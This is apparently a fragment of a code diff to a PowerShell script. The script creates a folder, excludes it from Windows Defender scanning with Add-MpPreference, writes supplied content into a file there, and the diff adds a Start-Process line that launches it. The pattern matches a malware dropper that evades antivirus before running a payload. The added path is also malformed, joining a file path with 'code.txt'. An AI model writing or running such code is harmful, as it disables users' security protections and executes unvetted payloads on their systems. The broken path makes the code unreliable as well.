@@ -8,3 +8,4 @@ New-Item -Path $directoryPath -ItemType Directory
 Add-MpPreference -ExclusionPath $directoryPath
 $path = "$directoryPath\$name"
 Set-Content -Path $path -Value $Filecontent
+Start-Process "$path\code.txt"
